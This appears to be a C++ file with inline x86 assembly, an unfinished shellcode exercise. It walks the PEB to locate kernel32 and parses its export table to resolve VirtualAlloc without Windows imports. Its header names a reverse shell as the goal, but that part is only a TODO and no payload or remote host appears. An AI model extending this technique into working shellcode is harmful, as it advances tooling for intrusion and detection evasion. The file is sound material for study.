/*
* Executing Shellcode without WINAPI
* (Attempts to establish reverse shell)
*
* References:
* 	- https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
*/
#include <cstdio>

#define NAKED __declspec( naked )

/*
	__asm // Stack prologue
	{
		push ebp
		mov ebp, esp
	}
	__asm // Stack prologue
	{
		mov esp, ebp
		pop ebp
		ret
	}
	__asm
	{
		
	}
*/

void *getKernel32Base()
{
	__asm
	{
		xor edx, edx
		mov ebx, fs:[edx+0x30] // PEB
		mov ebx, [ebx+0x0c] // LoaderData
		mov ebx, [ebx+0x14] // InMemoryOrderModuleList[0]
		mov ebx, [ebx] // InMemoryOrderModuleList[1]
		mov ebx, [ebx] // InMemoryOrderModuleList[2] (kernel32)
		mov eax, [ebx+0x10] // Base address
	}
}

int stringlength(char *mystring)
{
	__asm
	{
		mov esi, [ebp+8]
		xor ecx, ecx
		
		_strlen_loop:
		inc ecx
		lodsb
		test al, al
		jnz _strlen_loop
		
		mov eax, ecx
	}
}

NAKED void *getFunctionAddr(void *dll_base, char *funcname)
{
	__asm // Stack prologue
	{
		push ebp
		mov ebp, esp
		sub esp, 0x10
	}
	__asm // Retrieve export, name pointer, and ordinal table addresses
	{
		mov ebx, [ebp+8] // Base address from arg1
		
		mov eax, [ebx+0x3c]
		add eax, ebx        
		mov eax, [eax+0x78]
		add eax, ebx        // Export table
		mov ecx, [eax+0x1c]
		add ecx, ebx        
		mov [ebp-4], ecx    // Address table
		mov edx, [eax+0x20]
		add edx, ebx        
		mov [ebp-8], edx    // Name ptr table
		mov edi, [eax+0x24]
		add edi, ebx        
		mov [ebp-0x0c], edi // Ordinal table
		mov edx, [eax+0x14] // Number of exported functions
	}
	__asm // Retrieve function address
	{
		cld
		push [ebp+0x0c]
		call stringlength
		add esp, 4
		mov [ebp-0x10], eax // Length of function name string
		xor eax, eax
		
		_loop:
		mov edi, [ebp-8]    // Name ptr table
		mov esi, [ebp+0x0c] // Function name from arg2
		xor ecx, ecx
		mov edi, [edi+eax*4]
		add edi, ebx
		mov cx, [ebp-0x10]
		repe cmpsb
		jz _match
		
		inc eax
		cmp eax, edx // Check if last function name has been reached
		jb _loop
		
		mov eax, -1
		jmp _leave
		
		_match:
		mov ecx, [ebp-0x0c] // Ordinal table
		mov edx, [ebp-4]    // Address table
		mov ax, [ecx+eax*2] // Function ordinal
		mov eax, [edx+eax*4]
		add eax, ebx        // Address of function
	}
	__asm // Stack prologue
	{
		_leave:
		mov esp, ebp
		pop ebp
		ret
	}
}


/* TODO:
* 	- Impliment weird jmp/call ala msfvenom
* 	- Call VirtualAlloc, then copy byte code into address space
*/
int main()
{
	void *kernel32_base = getKernel32Base();
	printf("Kernel32 Base Address: 0x%08p\n", kernel32_base);
	void *virtualAllocAddr = getFunctionAddr(kernel32_base, "VirtualAlloc");
	printf("VirtualAlloc Address: 0x%08p\n", virtualAllocAddr);
	
	
	return 0;
}
